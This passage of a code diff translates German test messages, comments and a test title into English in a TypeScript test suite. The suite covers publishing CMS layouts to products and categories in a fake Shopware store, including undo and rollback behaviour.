+  assert.deepEqual(allCats.categoryIds!.sort(), ['outdoor', 'wohnen'], 'only page categories without root');
   await assert.rejects(resolvePublishScope(f.sw, { target: 'product', allProducts: true, productIds: ['p1'] }), /mehrdeutig/);
   await assert.rejects(resolvePublishScope(f.sw, { target: 'product', productsInCategoryId: 'weg' }), /Kategorie weg nicht gefunden/);
 
   const cs = await buildPublishChangeSet(f.sw, PDP, all);
   const labels = cs.items.map(i => i.label);
-  assert.ok(labels.includes('30 Produkte') && cs.items.length < 15, 'Zusammenfassung statt 30 Zeilen');
+  assert.ok(labels.includes('30 Produkte') && cs.items.length < 15, 'summary instead of 30 rows');
   assert.match(cs.items.find(i => i.label === '30 Produkte')!.before, /4 mit eigenem Layout \(wird ersetzt\), 26 ohne/);
   assert.ok(cs.items.some(i => i.label === 'Geltungsbereich' && /Alle Produkte: 30/.test(i.after)));
 
@@ -423,23 +423,23 @@ test('Layout-Bereichswahl: Bereich wird in feste IDs aufgelöst, große Mengen a
   assert.ok(r.results[0].ok, r.error ?? '');
   const pageId = r.published!.cmsPageId;
   assert.ok(f.db.product.filter(p => p.parentId === null).every(p => p.cmsPageId === pageId));
-  assert.equal(f.db.product.find(p => p.id === 'v1')!.cmsPageId, null, 'Variante bleibt unberührt');
-  assert.equal(r.undo.length, 31, 'Layout + 30 Zuweisungen');
+  assert.equal(f.db.product.find(p => p.id === 'v1')!.cmsPageId, null, 'variant stays untouched');
+  assert.equal(r.undo.length, 31, 'layout + 30 assignments');
   await undoOps(f.sw, r.undo);
   assert.equal(f.db.product.filter(p => p.cmsPageId === 'alt').length, 4);
   assert.equal(f.db['cms-page'].filter(p => p.id === pageId).length, 0);
 
-  // mehrere Kategorien ohne Meta: beide bekommen das Layout; ein fehlendes Ziel nimmt alles zurück
+  // several categories without meta: both get the layout; a missing target rolls everything back
   const c2 = await applyChangeSet(f.sw, pageCs(['i0']), { spec: SPEC, args: allCats }, new Set(['i0']));
   assert.ok(c2.results[0].ok, c2.error ?? '');
   assert.deepEqual(f.db.category.filter(c => c.cmsPageId).map(c => c.id).sort(), ['outdoor', 'wohnen']);
   await undoOps(f.sw, c2.undo);
   const bad = await applyChangeSet(f.sw, pageCs(['i0']), { spec: SPEC, args: { target: 'category', categoryIds: ['outdoor', 'weg'] } }, new Set(['i0']));
   assert.match(bad.error!, /Kategorie weg nicht mehr vorhanden/);
-  assert.equal(f.db.category.filter(c => c.cmsPageId).length, 0, 'nichts geändert');
+  assert.equal(f.db.category.filter(c => c.cmsPageId).length, 0, 'nothing changed');
 });
 
-test('Kategorie mit Landingpage-Layout (Startseite): Zuweisung über category, nie für alle Kategorien, Strukturelement abgelehnt', async () => {
+test('category with landing page layout (home page): assignment via category, never for all categories, structure element rejected', async () => {
   const { applyChangeSet, undoOps, buildPublishChangeSet } = await import('../../src/server/changes');
   const home = { ...SPEC, type: 'landingpage' } as PageSpec;
   const f = fakeShopware({ category: [{ id: 'start', type: 'page', translated: { name: 'Startseite' }, cmsPageId: 'alt' }, { id: 'ord', type: 'folder', translated: { name: 'Sortiment' } }], 'sales-channel': [{ id: 'sc', domains: [{ url: 'https://shop.test' }] }] });
